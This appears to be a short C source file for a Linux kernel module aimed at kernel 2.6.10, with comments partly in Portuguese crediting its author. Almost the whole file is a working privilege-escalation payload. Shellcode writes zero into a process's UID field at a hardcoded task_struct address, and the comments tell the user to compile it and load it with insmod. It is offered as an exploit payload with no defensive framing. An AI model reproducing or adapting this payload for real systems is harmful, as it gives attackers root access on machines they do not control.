/* kernel payload to 2.6.10
 * Change Process's UID.
 * Nash Leon - nashleon@yahoo.com.br
 * Execute shell script comp.sh pra compilar
 * esse LKM. Depois Execute `insmod payload.ko`.
 */

#include <linux/module.h>
#include <linux/config.h>
#include <linux/init.h>

#define TASK_ADDRESS "\x60\xda\x51\xdf"

char payload[]=
"\xb8" TASK_ADDRESS          //      mov    PROCESS_ADDRESS,%eax
"\xc7\x80\x98\x01\x00\x00"   //      movl $0x0,0x198(%eax)
"\x00\x00\x00\x00"
"\x31\xc0"                   //      xor    %eax,%eax
"\x40"                       //      inc    %eax
"\xcd\x80";                  //      int    $0x80


static int __init inicio(void) {
__asm__("jmp *%0"::"a"(&payload));
return 0;
}

static void __exit saida(void) {
}

module_init(inicio);
module_exit(saida);

MODULE_LICENSE("GPL");

